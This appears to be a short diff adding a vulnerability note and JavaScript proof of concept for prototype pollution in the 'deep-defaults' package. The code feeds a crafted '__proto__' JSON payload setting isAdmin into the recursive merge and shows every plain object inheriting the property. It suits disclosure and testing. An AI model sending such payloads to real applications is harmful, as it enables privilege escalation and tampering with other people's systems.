@@ -1,0 +1,15 @@
+Confirmed prototype pollution in `deep-defaults` via unguarded recursive merge (no `__proto__`/key-ownership check).
+
+```javascript
+const deepDefaults = require("./node_modules/deep-defaults");
+
+// Simulate untrusted input (e.g. parsed JSON from a user request)
+const untrustedInput = JSON.parse('{"__proto__":{"isAdmin":true}}');
+
+const target = {};
+deepDefaults(target, untrustedInput);
+
+// Prototype pollution: every plain object in the process now inherits isAdmin
+console.log("Polluted Object.prototype.isAdmin:", ({}).isAdmin); // true
+console.log("Arbitrary object gained property:", ({}).isAdmin === true);
+```
